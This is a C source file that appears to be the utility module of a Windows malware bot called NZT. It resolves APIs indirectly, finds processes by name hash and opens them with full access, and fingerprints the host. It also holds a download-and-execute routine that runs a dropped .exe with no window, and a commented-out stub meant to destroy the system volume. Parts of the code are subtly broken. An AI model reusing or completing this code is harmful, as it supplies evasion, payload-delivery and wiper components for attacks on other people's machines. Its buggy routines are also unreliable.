#include "utils.h"
#include "crt.h"
#include "nzt.h"
#include "config.h"
#include "registry.h"

DWORD GenerateSeed(DWORD Seed)
{
	return (NZT_VERSION + Seed);
}

DWORD RandomNumber(DWORD Seed)
{
	ULONG Random = 0;
	Random = Seed;
	return API(RtlRandomEx(&Random));
}

DWORD GetRandomNumber()
{
	ULONG Random;
	POINT Point;

	MemoryZero(&Point, sizeof(POINT));

	if (!API(GetCursorPos)(&Point))
		return 0;

	Random = (Point.x * Point.y) * API(GetTickCount());

	return RandomNumber(Random);
}

DWORD GetOperatingSystem()
{
	DWORD OS = 0;
	OSVERSIONINFOEXW Version;

	MemoryZero(&Version, sizeof(OSVERSIONINFOEXW));
	Version.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

	if (API(RtlGetVersion) != NULL)
		API(RtlGetVersion)((PRTL_OSVERSIONINFOW)&Version);

	if (API(RtlGetVersion) == NULL)
		API(GetVersionExW)((LPOSVERSIONINFOW)&Version);

	if (Version.dwMajorVersion == 5 && Version.dwMinorVersion == 0)
		OS = WINDOWS_2000;
	else if (Version.dwMajorVersion == 5 && Version.dwMinorVersion > 0)
		OS = WINDOWS_XP;
	else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 0)
		OS = WINDOWS_VISTA;
	else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 1)
		OS = WINDOWS_7;
	else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 2)
		OS = WINDOWS_8;
	else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 3)
		OS = WINDOWS_8_1;
	else if (Version.dwMajorVersion == 10 && Version.dwMinorVersion == 0)
		OS = WINDOWS_10;
	else if (Version.dwMajorVersion == 10 && Version.dwMinorVersion == 0 && Version.dwBuildNumber >= 22000)
		OS = WINDOWS_11;

	return OS;
}

PPEB GetPeb(VOID)
{
#ifdef WIN64
	return (PPEB)__readgsqword(0x60);
#else
	return (PPEB)__readfsdword(0x30);
#endif
}

BOOL Is64Bit()
{
#if defined(_WIN64)
	return TRUE;  // 64-bit programs run only on Win64
#elif defined(_WIN32)
	// 32-bit programs run on both 32-bit and 64-bit Windows
	// so must sniff
	BOOL b64 = FALSE;
	return API(IsWow64Process)(API(GetCurrentProcess()), &b64) && b64;
#else
	return FALSE; // Win64 does not support Win16
#endif
}

PDWORD GetSerialNumber()
{
	wchar_t			VolumeBuffer[MAX_PATH], FileSysName[MAX_PATH];
	static DWORD	SerialNumber;
	DWORD			MaximumComponentLength;
	DWORD			SysFlags;
	HANDLE			hVolume;
	BOOL			bResult = FALSE;

	MemoryZero(&VolumeBuffer, sizeof(VolumeBuffer));
	MemoryZero(&FileSysName, sizeof(FileSysName));

	if ((hVolume = API(FindFirstVolumeW)(VolumeBuffer, MAX_PATH)) == INVALID_HANDLE_VALUE)
		return 0;

	bResult = API(GetVolumeInformationW)(VolumeBuffer, NULL, MAX_PATH, &SerialNumber, &MaximumComponentLength, &SysFlags, FileSysName, MAX_PATH);

	API(FindVolumeClose)(hVolume);

	if (bResult)
		return &SerialNumber;

	return 0;
}

LPSTR GetUsername()
{
	static CHAR  Buffer[255];
	CHAR		 Username[255];
	DWORD		 Size = 255;

	MemoryZero(&Username, sizeof(Username));

	if (API(GetUserNameA)(Username, &Size))
		API(wsprintfA)(Buffer, "%s", Username);

	return Buffer;
}

BOOL GetModulePath(
	HMODULE		Module,		// a handle of the module within current process
	PVOID*		ModulePath,	// returned module path
	BOOL		bUnicode
)
{
	BOOL	Status;
	ULONG	rSize, Size = MAX_PATH;
	PVOID	Path;

	while ((Path = Malloc(Size * sizeof(WCHAR))) &&
		(rSize = (API(GetModuleFileNameW)(Module, Path, Size))) &&
		(Size == rSize))
	{
		Size += MAX_PATH;
		Free(Path);
	}

	if (Path)
	{
		if (rSize)
		{
			*ModulePath = Path;
			Status = TRUE;
		}
		else
		{
			Status = FALSE;
			Free(Path);
		}
	}
	else
		Status = FALSE;

	return(Status);
}

LPWSTR GetSystem32()
{
	wchar_t SystemDirectory[MAX_PATH];
	MemoryZero(&SystemDirectory, sizeof(SystemDirectory));

	if (API(GetSystemDirectoryW)(SystemDirectory, MAX_PATH) != 0)
	{
		return StringCopyW(SystemDirectory, StringLengthW(SystemDirectory));
	}

	return NULL;
}

PWCHAR GetFolderPath(DWORD CSIDL)
{
	LPWSTR	FolderPath;
	WCHAR	Buffer[MAX_PATH];

	MemoryZero(&FolderPath, sizeof(FolderPath));
	API(SHGetFolderPathW)(0, CSIDL, 0, 0, FolderPath);

	if ((FolderPath = StringCopyW(Buffer, StringLengthW(Buffer))) == NULL)
		return NULL;

	if (!StringEndsWithSlashW(FolderPath))
		StringConcatW(&FolderPath, L"\\");

	return FolderPath;
}

LPWSTR GetDirectoryPath(int PathIndex)
{
	LPWSTR Names[] = { L"AppData", L"Desktop", L"Startup" };
	LPWSTR Path;

	if (RegistryReadValue(HIVE_HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", Names[PathIndex], &Path))
	{
		if (!StringEndsWithSlashW(Path))
		{
			if (!StringConcatW(&Path, L"\\"))
			{
				Free(Path);
				Path = NULL;
			}
		}

		return Path;
	}

	return NULL;
}

DWORD GetProcessIdByHandle(HANDLE Process)
{
	DWORD						PbiSize = 0;
	PROCESS_BASIC_INFORMATION	pbi;
	
	MemoryZero(&pbi, sizeof(PROCESS_BASIC_INFORMATION));

	if (API(NtQueryInformationProcess)(Process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &PbiSize) >= 0 && pbi.PebBaseAddress != 0)
	{
		return pbi.UniqueProcessId;
	}

	return -1;
}

DWORD GetProcessIdByHash(DWORD Hash)
{
	HANDLE			Snapshot;
	PROCESSENTRY32W ProcessEntry;
	DWORD			ProcessId	  = -1;
	DWORD			CurrentHash = 0;

	if ((Snapshot = API(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
		return -1;

	if (!API(Process32FirstW)(Snapshot, &ProcessEntry))
	{
		API(CloseHandle)(Snapshot);
		return -1;
	}

	do
	{
		CurrentHash = Crc32Hash(ProcessEntry.szExeFile, StringLengthW(ProcessEntry.szExeFile) * 2);

		if (CurrentHash == Hash)
		{
			ProcessId = ProcessEntry.th32ProcessID;
			break;
		}
	} while (API(Process32NextW(Snapshot, &ProcessEntry)));

	API(CloseHandle)(Snapshot);
	return ProcessId;
}

HANDLE GetProcessByName(LPWSTR name)
{
	DWORD pid = 0;

	HANDLE snapshot = API(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W process;
	MemoryZero(&process, sizeof(process));
	process.dwSize = sizeof(process);

	if (API(Process32FirstW)(snapshot, &process))
	{
		do
		{
			if (!StringCompareW(process.szExeFile, name))
			{
				pid = process.th32ProcessID;
				break;
			}
		} while (API(Process32NextW)(snapshot, &process));
	}

	API(CloseHandle)(snapshot);

	if (pid != 0)
		return  API(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pid);


	return NULL;
}

BOOL StartFileProcess(CONST PWCHAR Path, BOOL ShowWindow)
{
	STARTUPINFOW		StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	DWORD				Show = ShowWindow ? CREATE_NO_WINDOW : 0;

	MemoryZero(&StartupInfo, sizeof(STARTUPINFOW));
	MemoryZero(&ProcessInformation, sizeof(PROCESS_INFORMATION));

	if (!API(CreateProcessW)(Path, Path, 0, 0, FALSE, Show, 0, 0, &StartupInfo, &ProcessInformation))
		return FALSE;

	API(CloseHandle)(ProcessInformation.hProcess);
	API(CloseHandle)(ProcessInformation.hThread);
	
	return TRUE;
}

BOOL DownloadFile(CONST PCHAR URL, BOOL Execute)
{
	LPWSTR TempPath;
	WCHAR DownloadPath[MAX_PATH], wzURL[MAX_PATH];

	if ((TempPath = GetFolderPath(CSIDL_LOCAL_APPDATA)) == NULL)
		return FALSE;

	MemoryZero(&DownloadPath, sizeof(DownloadPath));
	API(wsprintfW)(DownloadPath, L"%s%d.exe", TempPath, GetRandomNumber());

	MemoryZero(&wzURL, sizeof(wzURL));
	API(MultiByteToWideChar)(CP_ACP, MB_PRECOMPOSED, URL, StringLengthA(URL), (LPWSTR)&wzURL, MAX_PATH);

	/*if (URLDownloadToFileW(0, wzURL, DownloadPath, 0, 0) != S_OK)
		return FALSE;*/

	if (Execute)
		return StartFileProcess(DownloadPath, TRUE);

	return TRUE;
}

VOID _Sleep(DWORD Miliseconds)
{
	LARGE_INTEGER li;
	li.QuadPart = -((LONGLONG)Miliseconds * 10000);
	API(NtDelayExecution)(FALSE, &li);
}

HANDLE CreateMutexOfProcess(DWORD ProcessID)
{
	HANDLE	Mutex;
	wchar_t wzMutex[255];

	MemoryZero(&wzMutex, sizeof(wzMutex));
	API(wsprintfW)(wzMutex, L"%x%x", GetSerialNumber(), ProcessID);

	if ((Mutex = API(OpenMutexW)(SYNCHRONIZE, FALSE, wzMutex)) == 0)
	{
		return API(CreateMutexW)(0, FALSE, wzMutex);
	}

	API(CloseHandle)(Mutex);

	return 0;
}

/*WINERROR DestroyOS()
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	LPTSTR   Drive, Volume;
	HANDLE   File;
	
	if (Drive = Malloc(MAX_PATH))
	{
		if (GetWindowsDirectory(Drive, MAX_PATH))
		{
			Volume		= strchr(Drive, ':');
			Volume[1]	= 0;
			Volume		+= 2;

			wsprintf(Volume, "", Drive);

			File = CreateFileA(Volume, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
			if (File != INVALID_HANDLE_VALUE)
			{

			}
		}
	}
}*/